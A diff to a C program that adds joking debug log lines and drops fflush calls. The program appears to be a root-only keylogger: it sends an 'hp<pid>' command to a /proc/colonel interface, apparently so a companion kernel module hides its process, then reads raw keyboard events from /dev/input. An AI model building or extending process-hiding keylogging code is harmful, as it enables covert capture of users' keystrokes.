@@ -69,23 +69,22 @@ int main(void) {
 	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			                 /* forms command */
 	write(ftty, dpid, sizeof(dpid));						                 /* passes command to the colonel */
 	fprintf(fp, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));     /* records current pid to log */
+    fprintf(fp, "WHY AM I DYING? -- listening: %d, toggle: %s", listening, toggle);
 	close(ftty);
-	
+	fprintf(fp, "NO ERRORS FOR YOU! -- listening: %d, toggle: %s", listening, toggle);
 	if (!ftty) {
 		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
-        fflush(fp);
 		return 1;
 	}
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
 /*
 * DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
-*/	
+*/	fprintf(fp, "NOT ROOT! -- listening: %d, toggle: %s", listening, toggle);
 	if (geteuid() != 0) {									                 /* check if user is root */
 		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
-        fflush(fp);
 		return 1;
 	}
-
+    fprintf(fp, "JUST KIDDING, NOT WHILE -- listening: %d, toggle: %s", listening, toggle);
 	while(1) {				
 		fflush(fp);
 		read(fd, &ev, sizeof(struct input_event));			                  /* read from /dev/input/eventX */
